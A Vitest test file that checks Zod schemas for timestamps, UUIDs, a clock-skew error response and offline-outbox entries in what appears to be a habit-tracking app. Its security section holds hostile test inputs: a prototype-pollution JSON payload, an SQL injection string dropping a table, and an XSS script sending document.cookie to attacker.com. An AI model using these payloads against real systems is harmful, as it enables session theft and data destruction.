import { describe, it, expect } from 'vitest';
import {
  clockSkewErrorResponseSchema,
  outboxEntrySchema,
  outboxActionSchema,
  isoDateTimeStringSchema,
  uuidSchema
} from '../src/schemas/index.js';

describe('Empirical Challenge: ClockSkewErrorResponse & OutboxEntry', () => {
  const validUuid = '123e4567-e89b-42d3-a456-426614174000';
  const validIso = '2026-09-29T14:30:00.000Z';

  describe('1. Timestamp Validation Permissiveness & Edge Cases', () => {
    it('accepts compliant ISO 8601 UTC and offset strings', () => {
      const validCases = [
        '2026-09-29T14:30:00Z',
        '2026-09-29T14:30:00.000Z',
        '2026-09-29T21:30:00+07:00',
        '2026-09-29T07:30:00-07:00',
        '2026-09-29T14:30:00+00:00'
      ];
      for (const tc of validCases) {
        expect(isoDateTimeStringSchema.safeParse(tc).success).toBe(true);
      }
    });

    it('rejects clearly invalid date strings and non-string types', () => {
      const invalidCases = [
        'not-a-date',
        '2026-99-99T99:99:99Z',
        '2026-13-01T00:00:00Z',
        '2026-09-29T25:00:00Z',
        '2026-09-29T14:30:00.000Z extra',
        '',
        '   ',
        null,
        undefined,
        1727628000000,
        true,
        {},
        []
      ];
      for (const tc of invalidCases) {
        expect(isoDateTimeStringSchema.safeParse(tc).success).toBe(false);
      }
    });

    it('EMPIRICAL FINDING: reveals Date.parse permissiveness accepting non-ISO formats', () => {
      // Due to Date.parse() implementation in JS, non-ISO strings pass validation:
      const permissiveStrings = [
        '2026-09-29',                         // Date only, no time, no timezone
        'September 29, 2026',                 // English prose date
        '2026/09/29 14:30:00',                // Slash separated, no timezone
        'Tue Sep 29 2026 14:30:00 GMT+0000',  // toString format
        '2026-02-31T00:00:00Z',               // Non-existent calendar date (auto-rollover to March 3)
        '2026',                               // Year only
        '0',                                  // Epoch offset string
        '1'                                   // Epoch offset string
      ];

      for (const s of permissiveStrings) {
        const res = isoDateTimeStringSchema.safeParse(s);
        // Documents that loose Date.parse() accepts these non-standard strings
        expect(res.success, `Permissive string accepted: "${s}"`).toBe(true);
      }
    });

    it('rejects leap seconds (23:59:60) under Date.parse', () => {
      // Standard JS Date.parse rejects leap seconds
      const leapSecond = '2026-12-31T23:59:60Z';
      const res = isoDateTimeStringSchema.safeParse(leapSecond);
      expect(res.success).toBe(false);
    });
  });

  describe('2. UUID Validation & Standard Conformance', () => {
    it('accepts UUIDv1, UUIDv3, UUIDv4, and UUIDv5 in lowercase and uppercase', () => {
      const validCases = [
        '123e4567-e89b-42d3-a456-426614174000', // v4 lowercase
        '123E4567-E89B-42D3-A456-426614174000', // v4 uppercase
        '6ba7b810-9dad-11d1-80b4-00c04fd430c8', // v1
        '6ba7b811-9dad-31d1-80b4-00c04fd430c8', // v3
        '6ba7b812-9dad-51d1-80b4-00c04fd430c8'  // v5
      ];
      for (const uuid of validCases) {
        expect(uuidSchema.safeParse(uuid).success).toBe(true);
      }
    });

    it('EMPIRICAL FINDING: accepts NIL UUID (00000000-0000-0000-0000-000000000000)', () => {
      const nilUuid = '00000000-0000-0000-0000-000000000000';
      // Zod 3.24.2 accepts NIL UUID
      expect(uuidSchema.safeParse(nilUuid).success).toBe(true);
    });

    it('EMPIRICAL FINDING: accepts RFC 9562 UUIDv7 in Zod 3.24.2', () => {
      const v7Uuid = '018f6e2e-2f74-7e78-8fc6-8db724b12345';
      // Zod 3.24.2 accepts UUIDv7 format
      expect(uuidSchema.safeParse(v7Uuid).success).toBe(true);
    });

    it('rejects malformed UUID representations', () => {
      const malformedCases = [
        '{123e4567-e89b-12d3-a456-426614174000}', // with braces
        'urn:uuid:123e4567-e89b-12d3-a456-426614174000', // URN prefix
        '123e4567-e89b-12d3-a456-42661417400', // truncated (35 chars)
        ' 123e4567-e89b-12d3-a456-426614174000 ', // whitespace padding
        '123g4567-e89b-12d3-a456-426614174000', // non-hex character 'g'
        '123e4567e89b12d3a456426614174000' // missing hyphens
      ];
      for (const uuid of malformedCases) {
        expect(uuidSchema.safeParse(uuid).success).toBe(false);
      }
    });
  });

  describe('3. ClockSkewErrorResponse Edge Cases', () => {
    it('validates strictly the error discriminator literal CLOCK_SKEW', () => {
      const invalidDiscriminators = [
        'clock_skew',
        'CLOCK_SKEW_ERROR',
        'UNAUTHORIZED',
        'VALIDATION_ERROR',
        '',
        123,
        null
      ];
      for (const err of invalidDiscriminators) {
        const res = clockSkewErrorResponseSchema.safeParse({
          error: err,
          message: 'Skew detected',
          server_time: validIso
        });
        expect(res.success).toBe(false);
      }
    });

    it('strips extraneous root properties upon parsing', () => {
      const withExtra = {
        error: 'CLOCK_SKEW' as const,
        message: 'Clock skew detected',
        server_time: validIso,
        attacker_injection: 'DROP DATABASE',
        unauthorized_token: 'secret123'
      };

      const parsed = clockSkewErrorResponseSchema.parse(withExtra);
      expect(parsed).toEqual({
        error: 'CLOCK_SKEW',
        message: 'Clock skew detected',
        server_time: validIso
      });
      expect('attacker_injection' in parsed).toBe(false);
      expect('unauthorized_token' in parsed).toBe(false);
    });

    it('rejects missing or empty message', () => {
      const missingMsg = {
        error: 'CLOCK_SKEW',
        server_time: validIso
      };
      expect(clockSkewErrorResponseSchema.safeParse(missingMsg).success).toBe(false);
    });
  });

  describe('4. OutboxEntry Schema Edge Cases & Boundaries', () => {
    it('strictly enforces outboxActionSchema enum', () => {
      const validActions = ['insert', 'update', 'delete'];
      for (const a of validActions) {
        expect(outboxActionSchema.safeParse(a).success).toBe(true);
      }

      const invalidActions = ['upsert', 'INSERT', 'Delete', 'drop', 'create', '', null];
      for (const a of invalidActions) {
        expect(outboxActionSchema.safeParse(a).success).toBe(false);
      }
    });

    it('strictly enforces table enum to the 5 domain tables', () => {
      const tables = ['categories', 'habits', 'habit_schedules', 'logs', 'settings'];
      for (const table of tables) {
        const entry = {
          id: validUuid,
          table,
          record_id: validUuid,
          action: 'insert' as const,
          payload: {},
          created_at: validIso
        };
        expect(outboxEntrySchema.safeParse(entry).success).toBe(true);
      }

      const invalidTables = ['users', 'outbox', 'accounts', 'HABITS', '', null];
      for (const table of invalidTables) {
        const entry = {
          id: validUuid,
          table,
          record_id: validUuid,
          action: 'insert' as const,
          payload: {},
          created_at: validIso
        };
        expect(outboxEntrySchema.safeParse(entry).success).toBe(false);
      }
    });

    it('EMPIRICAL FINDING: record_id permits whitespace-only string', () => {
      // z.string().min(1) passes "   " because length is 3 without trimming
      const entry = {
        id: validUuid,
        table: 'habits' as const,
        record_id: '   ',
        action: 'insert' as const,
        payload: {},
        created_at: validIso
      };
      expect(outboxEntrySchema.safeParse(entry).success).toBe(true);
    });

    it('strips unknown root fields in outboxEntrySchema', () => {
      const entryWithExtra = {
        id: validUuid,
        table: 'categories' as const,
        record_id: validUuid,
        action: 'insert' as const,
        payload: { nama: 'Test' },
        created_at: validIso,
        malicious_seq: 999999,
        __injected: true
      };

      const parsed = outboxEntrySchema.parse(entryWithExtra);
      expect('malicious_seq' in parsed).toBe(false);
      expect('__injected' in parsed).toBe(false);
    });
  });

  describe('5. Prototype Pollution & Security Adversarial Tests', () => {
    it('resists prototype pollution in payload and root objects', () => {
      const payloadAttack = JSON.parse(
        '{"__proto__": {"pollutedKey": "injected"}, "constructor": {"prototype": {"pollutedKey2": "injected"}}}'
      );

      const entry = {
        id: validUuid,
        table: 'habits' as const,
        record_id: validUuid,
        action: 'insert' as const,
        payload: payloadAttack,
        created_at: validIso
      };

      outboxEntrySchema.parse(entry);

      // Verify Object.prototype is unpolluted
      expect((Object.prototype as any).pollutedKey).toBeUndefined();
      expect((Object.prototype as any).pollutedKey2).toBeUndefined();
      expect(({} as any).pollutedKey).toBeUndefined();
      expect(({} as any).pollutedKey2).toBeUndefined();
    });

    it('safely parses hostile strings (SQLi, XSS, Unicode, null bytes)', () => {
      const hostilePayload = {
        sqli: "'; DROP TABLE logs; --",
        xss: "<script>window.location='http://attacker.com?c='+document.cookie</script>",
        nullByte: "admin\0null",
        unicodeDir: "\u202Ereversed_text\u202C",
        emojiBomb: "💣".repeat(1000)
      };

      const entry = {
        id: validUuid,
        table: 'logs' as const,
        record_id: validUuid,
        action: 'insert' as const,
        payload: hostilePayload,
        created_at: validIso
      };

      const parsed = outboxEntrySchema.parse(entry);
      expect(parsed.payload).toEqual(hostilePayload);
    });
  });

  describe('6. Outbox Payload Structure & Type Boundaries', () => {
    it('accepts numeric boundaries, negative numbers, floats, and zero', () => {
      const payload = {
        negative_num: -9999,
        float_num: -0.0001,
        zero: 0,
        negative_zero: -0,
        max_safe: Number.MAX_SAFE_INTEGER,
        min_safe: Number.MIN_SAFE_INTEGER
      };

      const entry = {
        id: validUuid,
        table: 'settings' as const,
        record_id: validUuid,
        action: 'update' as const,
        payload,
        created_at: validIso
      };

      const parsed = outboxEntrySchema.parse(entry);
      expect(parsed.payload).toEqual(payload);
    });

    it('rejects arrays as payload (z.record rejects arrays)', () => {
      const entry = {
        id: validUuid,
        table: 'habits' as const,
        record_id: validUuid,
        action: 'insert' as const,
        payload: ['item1', 'item2'],
        created_at: validIso
      };

      expect(outboxEntrySchema.safeParse(entry).success).toBe(false);
    });

    it('rejects primitives and null as payload', () => {
      const invalidPayloads = [null, undefined, 'string', 123, true];
      for (const p of invalidPayloads) {
        const entry = {
          id: validUuid,
          table: 'habits' as const,
          record_id: validUuid,
          action: 'insert' as const,
          payload: p,
          created_at: validIso
        };
        expect(outboxEntrySchema.safeParse(entry).success).toBe(false);
      }
    });

    it('handles deep object nesting in payload (100 levels) without stack overflow', () => {
      let nested: any = { base: 'leaf' };
      for (let i = 0; i < 100; i++) {
        nested = { child: nested };
      }

      const entry = {
        id: validUuid,
        table: 'categories' as const,
        record_id: validUuid,
        action: 'insert' as const,
        payload: nested,
        created_at: validIso
      };

      const parsed = outboxEntrySchema.parse(entry);
      expect(parsed.payload).toBeDefined();
    });
  });
});
